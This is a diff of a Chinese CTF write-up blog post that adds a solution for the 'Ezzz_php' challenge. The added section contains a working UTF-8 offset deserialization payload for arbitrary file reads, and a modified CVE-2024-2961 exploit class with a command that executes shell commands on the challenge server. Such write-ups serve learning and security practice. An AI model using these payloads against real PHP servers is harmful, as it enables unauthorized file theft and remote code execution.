@@ -1,8 +1,8 @@
 +++
 title = "CTF Show 刷题记录"
 author = ["4shen0ne"]
-publishDate = 2024-12-08T00:00:00+08:00
-tags = ["ctf"]
+lastmod = 2024-12-24T20:45:55+08:00
+tags = ["ctf", "writeup"]
 draft = false
 +++
 
@@ -70,8 +70,7 @@ Product Version:   1, 0, 0, 630
 
 ### 没耳朵都可以 {#没耳朵都可以}
 
-mp3 文件帧头部结构中，有一个 original 位用来表示文件是否为原版，详情参考：
-<https://www.cnblogs.com/shakin/p/4012780.html>
+mp3 文件帧头部结构中，有一个 original 位用来表示文件是否为原版，详情参考：<https://www.cnblogs.com/shakin/p/4012780.html>
 
 010Editor 打开文件，根据提示找到以下标志位：
 
@@ -660,6 +659,114 @@ def templates():
     ```text
     flask-unsign --cookie "{'password': 'ctfshow', 'username': 'adminer'}" --secret ctfshow --sign
     ```
+
+
+### Ezzz_php {#ezzz-php}
+
+```php
+ <?php
+highlight_file(__FILE__);
+error_reporting(0);
+function substrstr($data)
+{
+    $start = mb_strpos($data, "[");
+    $end = mb_strpos($data, "]");
+    return mb_substr($data, $start + 1, $end - 1 - $start);
+}
+class read_file{
+    public $start;
+    public $filename="/etc/passwd";
+    public function __construct($start){
+        $this->start=$start;
+    }
+    public function __destruct(){
+        if($this->start == "gxngxngxn"){
+           echo 'What you are reading is:'.file_get_contents($this->filename);
+        }
+    }
+}
+if(isset($_GET['start'])){
+    $readfile = new read_file($_GET['start']);
+    $read=isset($_GET['read'])?$_GET['read']:"I_want_to_Read_flag";
+    if(preg_match("/\[|\]/i", $_GET['read'])){
+        die("NONONO!!!");
+    }
+    $ctf = substrstr($read."[".serialize($readfile)."]");
+    unserialize($ctf);
+}else{
+    echo "Start_Funny_CTF!!!";
+} Start_Funny_CTF!!!
+```
+
+我们可以控制的是 start 和 read 两个请求参数，但 start 的作用不大，需要想办法通过 read 参数将 read_file 的序列化字符串赋值给 `$ctf` 以实现任意文件读取
+
+赋值 `$ctf` 变量前会通过 substrstr 提取中括号内的子字符串，所以 payload 要放到中括号里面(`?read=[payload]`)，但中括号又被过滤了，需要想办法绕过
+
+从[这篇文章](https://www.sonarsource.com/blog/joomla-multiple-xss-vulnerabilities/)可以了解到 PHP 的 `mb_strpos` 和 `mb_substr` 函数在处理 UTF-8 前导字节 `f0` （意味着字符长度为四个字节）时有一点区别，总结一下有以下三点：
+
+1.  mb_substr 遇到 `f0` 时会直接把它和接着的 3 个字节当作一个编码字符，即使后面的字节不符合 UTF-8 编码
+
+    {{< figure src="/ox-hugo/_20241223_152714screenshot.png" >}}
+2.  mb_strpos 遇到 `f0` 会继续读取后续字节，直到读取完整的四字节的编码字符，如果遇到不符合编码的字节，就会把前面的字节当成一个编码字符
+
+    {{< figure src="/ox-hugo/_20241223_155256screenshot.png" >}}
+3.  mb_strpos 遇到中间字节 `9f` 会直接跳过，而 mb_substr 不会，也就是说如果先通过 mb_strpos 定位某个字符再用 mb_substr 截取，在前面添加 `9f` 会导致截取时的 index 比实际上的 index 要靠前
+
+利用以上第三点，我们可以构造 payload 使得 substrstr 提取到中括号左侧的字符串，刚好 `$read` 是拼接到中括号前面（左侧），那么就不需要在 payload 中加中括号了，利用 `9f` 把截取结果偏移到 payload 上就好了
+
+⚠️ 这个 bug 在 PHP 8.3 修了，本地测试时注意要用旧版本
+
+需要向左偏移几个字节长度，就在前面加几个 `9f` 字节，还要多偏移一个字节代替 `[` ，同时要保证中括号内的字符串长度和左侧的 payload 长度一致
+
+验证一下读取 /proc/self/cmdline
+
+```text
+/?start=gxngxngxnaaaaaa&read=%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9f%9fO%3a9%3a"read_file"%3a2%3a{s%3a5%3a"start"%3bs%3a9%3a"gxngxngxn"%3bs%3a8%3a"filename"%3bs%3a18%3a"/proc/self/cmdline"%3b}
+```
+
+尝试了一下发现 flag 不是常规位置，还需要进一步利用
+
+CVE-2024-2961 可以将 PHP 的任意文件读取漏洞升级为命令执行，有[现成的 exp](https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py)，修改一下 Remote 的方法即可
+
+```python
+class Remote:
+    ...
+    def send(self, path: str) -> Response:
+        """Sends given `path` to the HTTP server. Returns the response.
+        """
+        payload = f'O:9:"read_file":2:{{s:5:"start";s:9:"gxngxngxn";s:8:"filename";s:{len(path)}:"{path}";}}'
+        return self.session.get(
+            self.url,
+            params=urllib.parse.urlencode(
+                {
+                    "start": f"{'a'*(len(payload)-74)}",
+                    "read": f"{'%9f'*(len(payload) + 1)}{payload}",
+                },
+                safe="%",
+            ),
+            # proxies={
+            #     "http": "http://localhost:8080",
+            #     "https": "http://localhost:8080",
+            # },
+        )
+
+    def download(self, path: str) -> bytes:
+        """Returns the contents of a remote file.
+        """
+        path = f"php://filter/convert.base64-encode/resource={path}"
+        response = self.send(path)
+        data = response.re.search(b"What you are reading is:(.*)", flags=re.S).group(1)
+        return base64.decode(data)
+```
+
+```text
+./cnext-exploit.py http://2f8a3833-8e81-4d3d-a99d-1d9c0d1cf7ad.challenge.ctf.show/ 'cat /must_rCE_F1nd_This_flag > /var/www/html/flag.txt'
+```
+
+
+### <span class="org-todo todo TODO">TODO</span> NewerFileDetector {#newerfiledetector}
+
+> Magika 是谷歌推出的一款新型 AI 文件类型检测工具，据说 Magika 的准确率和召回率达到 99% 以上。看 来开发再也不需要担心文件上传漏洞了。
 
 
 ## 未完持续... {#未完持续-dot-dot-dot}
